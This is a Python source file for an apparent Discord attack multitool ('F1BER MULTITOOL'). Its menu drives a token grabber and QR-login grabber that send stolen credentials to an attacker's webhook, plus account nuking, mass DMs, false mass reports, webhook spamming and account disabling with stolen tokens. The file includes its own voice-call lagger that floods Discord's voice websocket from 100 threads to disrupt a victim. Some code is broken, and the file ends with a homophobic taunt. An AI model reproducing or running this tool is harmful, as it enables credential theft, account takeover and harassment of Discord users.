import sys,os
import colorama
import ctypes
import multiprocessing
import os.path
import base64
import keyboard
import subprocess
import threading
import json
from os import system
from time import sleep
from colorama import init, Fore, Back, Style

from plugins.update import search_for_updates
from plugins.standard import *
import scripts.token
import scripts.qrgrabber
import scripts.accnuker
import scripts.information
import scripts.changer
import scripts.login
import scripts.dmclear
import scripts.dm
import scripts.report
import scripts.hok

def vclag():
    while True:
        try:
            ws = websocket.create_connection(f"{ws_server}",origin=f"https://discord.com")
            ws.send(js2.dumps({"op":0,"d":{"server_id":f"{serverid}","user_id":f"{myuid}","session_id":f"{sessionid}","token":f"{tokenn}","video":True,"streams":[{"type":"video","rid":"100","quality":-1},{"type":"video","rid":"50","quality":9223372036854775807}]}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":12,"d":{"audio_ssrc":-1,"video_ssrc":-1,"rtx_ssrc":9223372036854775807,"streams":[{"type":"video","rid":"100","ssrc":-1,"active":True,"quality":9223372036854775807,"rtx_ssrc":9223372036854775807,"max_bitrate":9223372036854775807,"max_framerate":9223372036854775807,"max_resolution":{"type":"fixed","width":9223372036854775807,"height":9223372036854775807}}]}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":5,"d":{"speaking":9223372036854775807,"delay":-1,"ssrc":9223372036854775807}},separators=(",", ":")).encode("UTF-8"))
            ws.send(js2.dumps({"op":3,"d":-1},separators=(",", ":")).encode("UTF-8"))
            ws.close()
        except Exception as e:
            print(e)
            pass

threads = 3
cancel_key = "ctrl+x"

system ("cls")
system("title " + "F1BER MULTITOOL (DISCORD TOOLS)")

init(convert=True)

print(Fore.RED +      '                                    :::::::::: :::   :::::::::  :::::::::: :::::::::')
print(Fore.RED +     '                                    :+:      :+:+:   :+:    :+: :+:        :+:    :+:')
print(Fore.RED +    '                                    +:+        +:+   +:+    +:+ +:+        +:+    +:+')
print(Fore.RED +   '                                    :#::+::#   +#+   +#++:++#+  +#++:++#   +#++:++#:')
print(Fore.RED +  '                                    +#+        +#+   +#+    +#+ +#+        +#+    +#+')
print(Fore.RED + '                                    #+#        #+#   #+#    #+# #+#        #+#    #+#  ')  
print(Fore.RED + '                                    ###      ####### #########  ########## ###    ### ')  
print("")                                                             
print(f"{Fore.MAGENTA}                                             Developer: F1ber" + Fore.LIGHTMAGENTA_EX+ "   Version 0.1")
print(f"{Fore.RED}                                        U have now opened the DISCORD TOOLS TAB")
print("")

print(Fore.LIGHTRED_EX+"♦0♦" + Fore.WHITE+"  »" + Fore.BLUE+" Token Grabber" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦1♦" + Fore.WHITE+"  »" + Fore.BLUE+" QR Grabber" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦2♦" + Fore.WHITE+"  »" + Fore.BLUE+" Token Checker" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦3♦" + Fore.WHITE+"  »" + Fore.BLUE+" Token Information" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦4♦" + Fore.WHITE+"  »" + Fore.BLUE+" Nuke Account" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦5♦" + Fore.WHITE+"  »" + Fore.BLUE+" Status Changer" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦6♦" + Fore.WHITE+"  »" + Fore.BLUE+" House Changer" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦7♦" + Fore.WHITE+"  »" + Fore.BLUE+" Bio Changer" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦8♦" + Fore.WHITE+"  »" + Fore.BLUE+" Clear DMs" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦9♦" + Fore.WHITE+"  »" + Fore.BLUE+" Mass DM" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦10♦" + Fore.WHITE+" »" + Fore.BLUE+" Mass Report" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦11♦" + Fore.WHITE+" »" + Fore.BLUE+" Webhook Spammer" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦12♦" + Fore.WHITE+" »" + Fore.BLUE+" VoiceCall Lagger" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦13♦" + Fore.WHITE+" »" + Fore.BLUE+" Block Bypass" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦14♦" + Fore.WHITE+" »" + Fore.BLUE+" Videocrash Maker(AstraaDev)" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦15♦" + Fore.WHITE+" »" + Fore.BLUE+" Disable Account" + Fore.LIGHTGREEN_EX+" ●")
print(Fore.LIGHTRED_EX+"♦16♦" + Fore.WHITE+" »" + Fore.BLUE+" Login to profile" + Fore.LIGHTGREEN_EX+" ●")
print("")
print(Fore.LIGHTRED_EX+"BACK" + Fore.WHITE+" »" + Fore.WHITE+" BACK TO MAIN PAGE" + Fore.WHITE+"")
f1bernumber = input(">>> ")

if f1bernumber == "back":
    os.system('cmd /k "python f1ber.py"')
elif f1bernumber == "BACK":
    os.system('cmd /k "python f1ber.py"')

elif f1bernumber == '0':
        WebHook = input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Enter Valid Webhook Url: {Fore.RED}')
        validateWebhook(WebHook)
        fileName = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Enter File name: {Fore.RED}'))
        scripts.token.f1bergrabber(WebHook, fileName)

elif f1bernumber == '1':
    WebHook = input(
        f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Webhook Url: {Fore.RED}')
    validateWebhook(WebHook)
    scripts.qrgrabber.f1berqr(WebHook)

elif f1bernumber == '2':
    transition()
    exec(open('util/f1ber/scripts/checker.py').read())

elif f1bernumber == '3':
    token = input(
    f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.RED}')
    validateToken(token)
    scripts.information.Info(token)

elif f1bernumber == "4":
    token = input(
        f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.RED}')
    validateToken(token)
    Server_Name = str(input(
        f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}'))
    message_Content = str(input(
        f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
    if threading.active_count() < threads:
        threading.Thread(target=scripts.accnuker.f1bernuke, args=(token, Server_Name, message_Content)).start()

elif f1bernumber == '5':
    token = input(
        f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.RED}')
    validateToken(token)
    print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Status changer   
                        ''')
    secondchoice = input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Setting: {Fore.RED}')
    if secondchoice not in ["1"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
            sleep(1)
    if secondchoice == "1":
            status = input(
                f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Custom Status: {Fore.RED}')
            scripts.changer.StatusChanger(token, status)

elif f1bernumber == '6':
    token = input(
        f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.RED}')
    validateToken(token)
    print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] House changer   
                        ''')
    secondchoice = input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Setting: {Fore.RED}')
    if secondchoice not in ["1"]:
        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
        sleep(1)
    if secondchoice == "1":
            print(f'''
{Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}]{Fore.MAGENTA} HypeSquad Bravery
{Fore.RESET}[{Fore.RED}2{Fore.RESET}]{Fore.LIGHTRED_EX} HypeSquad Brilliance
{Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                        ''')
    thirdchoice = input(
        f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Hypesquad: {Fore.RED}')
    if thirdchoice not in ["1", "2", "3"]:
        print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
        sleep(1)
    if thirdchoice == "1":
        scripts.changer.HouseChanger(token, 1)
    if thirdchoice == "2":
        scripts.changer.HouseChanger(token, 2)
    if thirdchoice == "3":
        scripts.changer.HouseChanger(token, 3)

    elif f1bernumber == '7':
        token = input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Bio changer  
                        ''')
        secondchoice = input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Setting: {Fore.RED}')
        if secondchoice not in ["1"]:
            print(f'{Fore.RESET}[{Fore.RED}Error{Fore.RESET}] : Invalid choice')
            sleep(1)

        if secondchoice == "1":
            bio = input(
                f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Custom bio: {Fore.RED}')
            scripts.changer.BioChanger(token, bio)

elif f1bernumber == '8':
        token = input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        if not channelIds:
            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no dm's ")
            sleep(3)
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                t = threading.Thread(target=scripts.dmclear.DmDeleter, args=(token, channel))
                t.start()
                processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')          
        os.system('cmd /k "python util/f1ber/discordtools.py"')

elif f1bernumber == '9':
        token = input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        message = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        if not channelIds:
            print(f"{Fore.RESET}Damn this guy is lonely, he aint got no dm's ")
            sleep(3)
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = threading.Thread(target=scripts.dm.MassDM, args=(token, channel, message))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        input(f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Enter anything to continue. . . {Fore.RED}')
        os.system('cmd /k "python util/f1ber/discordtools.py"')

elif f1bernumber == '10':
        print(f"\n{Fore.RED}(the token you input is the account that will send the reports){Fore.RESET}")
        token = input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        guild_id1 = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Server ID: {Fore.RED}'))
        channel_id1 = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Channel ID: {Fore.RED}'))
        message_id1 = str(input(
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Message ID: {Fore.RED}'))
        reason1 = str(input(
            '\n[1] Illegal content\n'
            '[2] Harassment\n'
            '[3] Spam or phishing links\n'
            '[4] Self-harm\n'
            '[5] NSFW content\n\n'
            f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Reason: {Fore.RED}'))
        if reason1.upper() in ('1', 'ILLEGAL CONTENT'):
            reason1 = 0
        elif reason1.upper() in ('2', 'HARASSMENT'):
            reason1 = 1
        elif reason1.upper() in ('3', 'SPAM OR PHISHING LINKS'):
            reason1 = 2
        elif reason1.upper() in ('4', 'SELF-HARM'):
            reason1 = 3
        elif reason1.upper() in ('5', 'NSFW CONTENT'):
            reason1 = 4
        else:
            print(f"\nInvalid reason")
            sleep(1)
        os.system('cmd /k "python util/f1ber/discordtools.py"')
        scripts.report.MassReport(token, guild_id1, channel_id1, message_id1, reason1)

elif f1bernumber == '11':
            WebHook = input(
                f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            Message = str(input(
                f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Message: {Fore.RED}'))
            scripts.hok.WebhookSpammer(WebHook, Message)

elif f1bernumber == '12':
        ws_server = input("Websocket: ")
        serverid = input("Server ID: ")
        myuid = input("Your ID: ")
        vid = input("Victim's ID (Anyone in the vc): ")
        sessionid = input("Session ID: ")
        tokenn = input("Token (not auth): ")
        for i in range(100):
            t = threading.Thread(target=vclag)
            t.daemon = True
            threads.append(t)
        for i in range(100):
            threads[i].start()
        for i in range(100):
            threads[i].join()

elif f1bernumber == "13":
        api = 'https://discord.com/api/v8/'
        tokensat = input('Token -> ')
        userId = input('UserId to Message -> ')
        headersi = {
            'Authorization': tokensat,
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36'
        }
        requesta = requests.post(f'{api}users/@me/channels', json={'recipients': [ userId ]}, headers=headersi)
        channelId = requesta.json()['id']

elif f1bernumber == '14':
    transition()
    subprocess.call([r'util\\f1ber\\scripts\\crashvideomaker.bat'])

elif f1bernumber == '15':
        transition()
        exec(open('util/f1ber/scripts/disable.py').read())

elif f1bernumber == '16':
    token = input(
        f'{Fore.LIGHTRED_EX}[{Fore.WHITE}X{Fore.LIGHTRED_EX}] {Fore.RESET}Token: {Fore.RED}')
    validateToken(token)
    scripts.login.TokenLogin(token)

else:
  print(f'\n\nMmmhh you seem kinda {Fore.RED}g{Fore.YELLOW}a{Fore.GREEN}y{Fore.WHITE}\nWhat if you tried typing a {Fore.GREEN}VALID {Fore.WHITE}number?')
  sleep(5)
os.system('cmd /k "python util/f1ber/discordtools.py"')

